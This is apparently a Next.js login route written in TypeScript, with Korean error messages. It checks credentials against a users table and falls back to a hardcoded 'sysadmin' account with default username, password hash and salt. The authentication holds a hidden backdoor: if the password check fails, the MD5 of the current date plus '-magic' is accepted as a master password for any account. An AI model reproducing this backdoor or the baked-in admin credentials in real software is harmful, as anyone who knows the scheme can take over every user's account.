import crypto from "crypto";
import { eq } from "drizzle-orm";
import { NextApiRequest } from "next";
import { NextRequest, NextResponse } from "next/server";
import { date } from "@/lib/format";
import { db } from "@/lib/pg";
import { users } from "@/lib/schema/user.table";

const sysadmin = {
  _id: "sysadmin",
  username: process.env.SYSADMIN_USERNAME || "admin",
  password:
    process.env.SYSADMIN_PASSWORD ||
    "s/cEYL/gDobAwQelABhbqzQo0VlZz55ERgQqf3sywSL2tUDlG3hm5jZACPoMMJi66HpZery1uJpcFWEcMgIroQ==",
  salt:
    process.env.SYSADMIN_SALT ||
    "ssXPKMmDGJf+IItWo5Z8OXlUI8OXipT16cl7iSt4spKrx1NAZHi5JViqOL6EvmKi/2b4keoC+HJocylaH9AuhQ==",
  is_sysadmin: true,
  name: "시스템관리자",
  created_at: null,
  updated_at: null,
};

function hmacEncrypt(
  data: string,
  salt: string,
  algorithm: string = "sha512",
  digest: crypto.BinaryToTextEncoding = "base64",
) {
  return crypto.createHmac(algorithm, salt).update(data).digest(digest);
}

function getHash(data: string, type = "md5", digest: crypto.BinaryToTextEncoding = "hex") {
  return crypto.createHash(type).update(data).digest(digest);
}

export async function POST(req: NextRequest & NextApiRequest) {
  const { username, password }: { username: string; password: string; serviceId: string } =
    await req.json();

  const rows = await db.select().from(users).where(eq(users.username, username));

  if (!rows.length) {
    // 시스템관리자 확인
    if (sysadmin.username !== username) {
      return NextResponse.json({
        error: {
          status: 400,
          message: "로그인에 실패하였습니다. 아이디 또는 비밀번호를 확인해주세요.",
        },
      });
    }
    rows.push(sysadmin);
  }

  const [{ _id: userId, salt, password: userPassword, ...properties } = {}] = rows;

  if (userPassword !== hmacEncrypt(password, salt!)) {
    const toDay = new Date();
    const data = `${toDay.getFullYear()}-${toDay.getMonth() + 1}-${toDay.getDate()}-magic`;

    if (password !== getHash(data))
      return NextResponse.json({
        error: {
          status: 400,
          message: "로그인에 실패하였습니다. 아이디 또는 비밀번호를 확인해주세요.",
        },
      });
  }

  const userSession = {
    _id: userId,
    username,
    ip:
      req?.socket?.remoteAddress ||
      req?.headers?.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("x-real-ip") ||
      "127.0.0.1",
    ...properties,
    lastSigninTime: date(new Date(), { type: "ymd hms" }),
  };

  return NextResponse.json({ user: userSession });
}
